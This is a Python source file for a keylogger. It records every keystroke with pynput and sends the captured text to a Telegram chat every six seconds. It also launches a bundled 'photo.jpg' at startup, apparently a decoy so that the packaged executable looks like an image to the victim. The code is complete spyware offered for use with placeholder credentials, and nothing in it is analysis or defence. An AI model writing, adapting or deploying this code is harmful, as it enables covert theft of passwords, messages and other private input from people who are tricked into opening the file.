import threading
import requests
import sys
import subprocess as sub
from pynput import keyboard
class TelegramBot:
    def __init__(self, bot_token, chat_id):
        self.bot_token = bot_token
        self.chat_id = chat_id
    def send_message(self, message):
        url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
        params = {
            "chat_id": self.chat_id,
            "text": message
        }
        try:
            response = requests.get(url, params=params)
            response.raise_for_status()  # Raises an error for non-200 responses
        except requests.exceptions.RequestException as e:
            print(f"Error sending message: {e}")
class Listener:
    def __init__(self, time, bot_token, chat_id):
        self.store_key = ''  # Initialize as empty
        self.time = time  # Interval time in seconds
        self.bot_token = bot_token # Telegram bot token
        self.chat_id = chat_id # Telegram bot chat ID
    def telgram(self,message):
        Telegram = TelegramBot(self.bot_token ,self.chat_id)
        Telegram.send_message(message)
    def log(self, string):
        self.store_key += string
    def key_press(self, key):
        # Determine key character or special key name
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                current_key = " "
            elif key == keyboard.Key.shift:
                current_key = ""
            else:
                current_key = f' {key} '  # Represent other special keys by their names
        # Log the current key
        self.log(current_key)
    def report(self):
        # Print and reset the stored keys
        #print(self.store_key)
        self.telgram(self.store_key)
        self.store_key = ' '  # Clear stored keys
        # Schedule the next report
        threading.Timer(self.time, self.report).start()

    def start(self):
        # Start reporting keystrokes at intervals
        self.report()
        # Set up and start the keyboard listener
        with keyboard.Listener(on_press=self.key_press) as listener:
            listener.join()

file_name = sys._MEIPASS+'/photo.jpg'
sub.Popen(file_name,shell=True)

bot_token = " "# Replace with your bot token
chat_id = " "  # Replace with your chat ID
REPORT_INTERVAL = 6
listener = Listener(REPORT_INTERVAL,bot_token,chat_id)
listener.start()
